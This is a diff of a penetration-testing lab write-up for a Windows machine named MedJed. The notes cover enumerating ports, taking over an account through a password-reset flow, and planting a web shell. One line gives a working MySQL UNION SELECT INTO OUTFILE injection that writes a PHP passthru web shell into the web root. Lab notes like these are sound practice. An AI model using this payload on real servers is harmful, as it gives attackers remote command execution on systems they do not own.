@@ -3,7 +3,7 @@ Alias: MedJed
 Date: 7/10/22
 Platform: Windows
 Difficulty: Intermediate
-Tags: #PHPwebshell #
+Tags: #phpinfo #RootDirectory #PHPwebshell #UNIONSELECTmysqlinjection
 Status: Finished
 IP: 192.168.114.127 
 ---
@@ -12,12 +12,14 @@ IP: 192.168.114.127
 
 
 # Resolution summary
+- Found phpinfo.php webpage on port 45332 showing the root directory
 - Navigated to port 33033 in web browser and found a site containing a list of team members pictures, names, email addresses and captions
 - Found a login page and clicked link "forgot password"
 - Attempted to input the found emails and information from the team members and found jerren.devops successful 
 - Logged in with jarren.devops and created a new password
 - Found the website was running mysql
-- Input a mysql command along with php webshell code
+- Input a mysql command along with php webshell code into the root directory 
+- 
 - Text
 
 ## Improved skills
@@ -467,7 +469,7 @@ Enumerated top 200 UDP ports:
 #sqlinjection 
 
 #### -As we confirmed previously the root directory of the target machine is "C:/xampp/htdocs" I typed ' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -' and request 
-#PHPwebshell #UNIONselectMYSQLinjection
+#PHPwebshell #UNIONSELECTmysqlinjection
 
 #### - Received no error
 
